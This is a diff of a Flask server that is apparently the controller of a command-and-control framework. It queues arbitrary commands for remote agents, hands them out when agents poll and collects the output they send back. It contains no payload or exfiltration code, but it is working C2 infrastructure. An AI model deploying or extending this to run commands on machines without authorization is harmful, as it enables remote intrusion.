@@ -1,49 +1,70 @@
 from flask import Flask, request, jsonify
-import os
-from c2_server.dispatcher import AgentStore
+from flask_cors import CORS
 
 app = Flask(__name__)
-store = AgentStore()
+CORS(app)
 
-@app.route("/agent/heartbeat", methods=["POST"])
-def heartbeat():
+# Store results per agent
+agent_results = {}
+# Simple in-memory command queue
+agent_commands = {}
+
+@app.route("/api/command", methods=["POST"])
+def handle_command():
     data = request.get_json()
-    registered = store.register_or_update(data)
-    if registered:
-        print(f"📡 Registered/Updated agent: {data.get('hostname')}")
-        return jsonify({"message": "ACK from C2"}), 200
-    else:
-        return jsonify({"error": "Missing hostname or IP"}), 400
+    if not data or "agent_id" not in data or "command" not in data:
+        return jsonify({"status": "error", "message": "Missing agent_id or command"}), 400
 
-@app.route("/agents", methods=["GET"])
-def list_agents():
-    agents = store.get_all_agents()
-    return jsonify(agents), 200
+    agent_id = data["agent_id"]
+    command = data["command"]
+    print(f"✅ Command '{command}' queued for agent '{agent_id}'")
+    agent_commands[agent_id] = command
+    return jsonify({"status": "success", "message": f"Command '{command}' queued for agent '{agent_id}'"})
 
-@app.route("/command/queue", methods=["POST"])
-def queue_command():
+
+@app.route("/api/get-command", methods=["POST"])
+def get_command():
     data = request.get_json()
-    hostname = data.get("hostname")
-    command = data.get("command")
+    agent_id = data.get("agent_id")
+    if not agent_id:
+        return jsonify({"status": "error", "message": "Missing agent_id"}), 400
 
-    if not hostname or not command:
-        return jsonify({"error": "hostname and command required"}), 400
-
-    store.queue_command(hostname, command)
-    print(f"✅ Queued command for {hostname}: {command}")
-    return jsonify({"message": "Command queued"}), 200
-
-@app.route("/agent/next", methods=["POST"])
-def next_command():
-    data = request.get_json()
-    hostname = data.get("hostname")
-
-    if not hostname:
-        return jsonify({"error": "hostname required"}), 400
-
-    command = store.get_next_command(hostname)
+    command = agent_commands.pop(agent_id, None)
     if command:
-        print(f"➡️  Dispatching command to {hostname}: {command}")
-        return jsonify({"command": command}), 200
-    else:
-        return jsonify({"command": None}), 200
+        return jsonify({"status": "command", "command": command})
+    return jsonify({"status": "idle"})
+
+
+@app.route("/api/command-result", methods=["POST"])
+def command_result():
+    data = request.get_json()
+    agent_id = data.get("agent_id")
+    result = data.get("result")
+
+    if agent_id and result is not None:
+        agent_results[agent_id] = result
+        print(f"🟩 Agent {agent_id} responded with:\n{result}")
+        return jsonify({"status": "success"})
+    return jsonify({"status": "error", "message": "Missing agent_id or result"}), 400
+
+
+@app.route("/api/command-results/<agent_id>", methods=["GET"])
+def get_result(agent_id):
+    if agent_id in agent_results:
+        return jsonify({"result": agent_results[agent_id]})
+    return jsonify({"result": None}), 200
+
+
+@app.route("/api/agents", methods=["GET"])
+def get_agents():
+    # Dummy agent for now
+    agents = [
+        {
+            "agent_id": "A01",
+            "hostname": "test-host",
+            "ip_address": "10.0.0.5",
+            "status": "Online",
+            "last_check_in": "Just now"
+        }
+    ]
+    return jsonify(agents)
